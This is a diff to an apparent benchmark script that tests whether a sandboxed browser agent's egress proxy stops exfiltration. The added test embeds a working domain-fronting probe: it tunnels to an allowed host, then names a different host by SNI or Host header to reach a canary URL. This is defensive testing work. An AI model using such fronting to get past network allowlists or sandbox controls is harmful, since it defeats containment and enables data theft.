@@ -8,13 +8,17 @@
 // authoritative name server for its own zone (dns-canary/server.mjs), which
 // sees any lookup of <token>.<zone> made anywhere on the internet. The
 // results go to DATA_DIR/bench.json and are shown on the demo page.
+import { execFile } from "node:child_process";
 import { randomBytes } from "node:crypto";
 import dns from "node:dns/promises";
 import { mkdir, writeFile } from "node:fs/promises";
 import path from "node:path";
+import { promisify } from "node:util";
 import { DATA_DIR } from "./agent.ts";
 import { ATTACKS, DEMO_URL, DNS_CANARY_ZONE } from "./demo-sites.ts";
-import { Sandbox, type ProxyEvent } from "./sandbox.ts";
+import { DRIVER, Sandbox, type ProxyEvent } from "./sandbox.ts";
+
+const execFileP = promisify(execFile);
 
 const CANARY_URL = (process.env.CANARY_URL ?? "http://localhost:4000/canary").replace(/\/$/, "");
 const CANARY_API = CANARY_URL.replace(/\/canary$/, "/api/canary");
@@ -51,8 +55,9 @@ async function runCase(name: string, label: string, allowHost: string, act: (sb:
   await new Promise((r) => setTimeout(r, 4000));
   const blocked = events.filter((e) => e.type === "blocked");
   const offsite = events.filter((e) => e.type === "allowed" && e.host !== allowHost);
-  // Requests to the demo host only fetch the attack page; they don't show the attack ran.
-  const attackRequests = events.filter((e) => (e.type === "blocked" || e.type === "allowed") && e.host !== demoHost);
+  // Requests to the demo host only fetch the attack page; they don't show the
+  // attack ran, unless the tunnel named another host inside it (fronting).
+  const attackRequests = events.filter((e) => (e.type === "blocked" || e.type === "allowed") && (e.host !== demoHost || !!e.inner));
   const hits = await canaryHits(token);
   const dHits = await dnsHits(token);
   const firedBy = attackRequests.length ? "request seen by the proxy" : hits || dHits ? "canary hit" : loaded ? "page loaded" : "";
@@ -120,6 +125,47 @@ const dnsExfil = await runCase("dns-exfil", "Top-level navigation to a hostname 
 dnsExfil.preDnsBlock = dnsExfil.blocked > 0 && dnsExfil.reasons.every((r) => /allowlist/i.test(r));
 cases.push(dnsExfil);
 console.log(`blocked ${dnsExfil.blocked} (${dnsExfil.reasons.join(", ")}) preDnsBlock=${dnsExfil.preDnsBlock} dns ${dnsExfil.dnsHits ?? "-"}`);
+
+// Domain fronting, as code that escaped the browser would try it: from inside
+// the browser container, open a tunnel to the allowed demo host and then name
+// a different host inside it (TLS SNI on 443, Host header on 80). The
+// orchestrator shares the demo host's IP and web server, so without a check
+// this reaches it; the fronted request goes to the HTTP canary, so a success
+// is counted there. A control tunnel naming the allowed host must work.
+const FRONT_PROBE = `
+const http=require("http"),tls=require("tls");const u=new URL(process.env.PROXY_URL);
+const out=(r)=>{console.log(JSON.stringify(r));process.exit(0)};
+const req=http.request({host:u.hostname,port:u.port,method:"CONNECT",path:process.env.T+":"+process.env.P});
+req.on("connect",(res,sock)=>{if(res.statusCode!==200)return out({tunnel:res.statusCode});
+const send=(s)=>{s.write("GET "+process.env.PATH_+" HTTP/1.1\\r\\nHost: "+process.env.INNER+"\\r\\nConnection: close\\r\\n\\r\\n");let d="";
+s.on("data",(c)=>d+=c);s.on("close",()=>out({reached:d?d.split("\\r\\n")[0]:null}));s.on("error",(e)=>out({error:e.code||e.message}))};
+if(process.env.P==="443"){const t=tls.connect({socket:sock,servername:process.env.INNER,rejectUnauthorized:false});t.on("error",(e)=>out({error:e.code||e.message}));t.on("secureConnect",()=>send(t))}else send(sock)});
+req.on("error",(e)=>out({error:e.message}));req.setTimeout(15000,()=>out({error:"timeout"}));req.end();`;
+if (DRIVER === "docker") {
+  process.stdout.write("domain-fronting … ");
+  const orchestratorHost = new URL(CANARY_URL).hostname;
+  const probes: Record<string, unknown> = {};
+  const fronting = await runCase(
+    "domain-fronting",
+    `Domain fronting from code inside the container: a tunnel to the allowed host that names the orchestrator (${orchestratorHost}) inside it`,
+    demoHost,
+    async (sb, token) => {
+      const probe = async (port: string, inner: string, p: string) => {
+        const { stdout } = await execFileP("docker", ["exec", "-e", `T=${demoHost}`, "-e", `P=${port}`, "-e", `INNER=${inner}`, "-e", `PATH_=${p}`, `${sb.name}-browser`, "node", "-e", FRONT_PROBE], { timeout: 30_000 }).catch((e) => ({ stdout: JSON.stringify({ error: String(e.message).slice(0, 80) }) }));
+        return JSON.parse(stdout.trim().split("\n").pop() || "{}");
+      };
+      probes.control = await probe("443", demoHost, "/acme");
+      probes.sni = await probe("443", orchestratorHost, `/canary/${token}`);
+      probes.host = await probe("80", orchestratorHost, `/canary/${token}`);
+    },
+  );
+  fronting.layer = "name inside the tunnel";
+  const controlOk = /^HTTP\/1\.1 [23]/.test(String((probes.control as { reached?: string })?.reached ?? ""));
+  (fronting as Case & { probes?: unknown; controlOk?: boolean }).probes = probes;
+  (fronting as Case & { controlOk?: boolean }).controlOk = controlOk;
+  cases.push(fronting);
+  console.log(`blocked ${fronting.blocked}, canary ${fronting.canaryHits}, control tunnel ${controlOk ? "ok" : "FAILED"} ${JSON.stringify(probes)}`);
+}
 
 // Controls: the same canaries, hit from outside the sandbox, must count.
 const control = randomBytes(8).toString("hex");
